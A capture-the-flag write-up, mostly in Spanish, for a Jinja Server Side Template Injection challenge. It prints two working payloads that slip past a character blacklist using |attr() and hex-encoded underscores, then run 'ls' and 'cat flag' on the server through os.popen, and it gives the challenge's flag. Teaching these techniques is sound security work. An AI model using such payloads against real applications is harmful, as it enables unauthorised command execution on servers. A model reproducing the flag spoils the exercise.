### Descripción
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://xebec.cylabacademy.net:24282/)!

Hints: 
1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?
### Solución

1. Accedemos a la instancia del reto y ubicamos el campo de texto destinado para crear un nuevo anuncio.
2. Identificamos que el servidor está filtrando caracteres especiales típicos para explotar plantillas en Python/Jinja (probablemente el punto `.` y el guion bajo `_`).          
3. Para evadir esta lista negra, construimos un payload utilizando técnicas de bypass. Usamos el filtro `|attr()` para evitar los puntos y codificamos los guiones bajos en formato hexadecimal (`\x5f`). Esto nos permite navegar por la jerarquía de objetos de Python (`__globals__`, `__builtins__`, `__import__`) sin activar las defensas del servidor.          
4. Enviamos un primer payload inyectando el comando `ls` para enumerar el directorio actual del servidor:                
    
    ```
    {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
    ```

5. El servidor procesa la plantilla, ejecuta el comando y nos devuelve el resultado en la pantalla: `__pycache__ app.py flag requirements.txt`. Con esto confirmamos que el archivo objetivo se llama exactamente `flag`.
6. Modificamos nuestro payload, cambiando la instrucción `ls` por `cat flag` para indicarle al sistema operativo que lea el contenido de ese archivo específico:
    ```
    {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
    ```
    
7. Al enviar este anuncio final, la vulnerabilidad ejecuta el comando de lectura y la página nos muestra la flag.
 
**Flag**: academy{sst1_f1lt3r_byp4ss_0a432894}

### Notas Adicionales

Este desafío ilustra por qué las **listas negras (Blacklisting)** son una mala práctica para la sanitización de entradas.
### Referencias
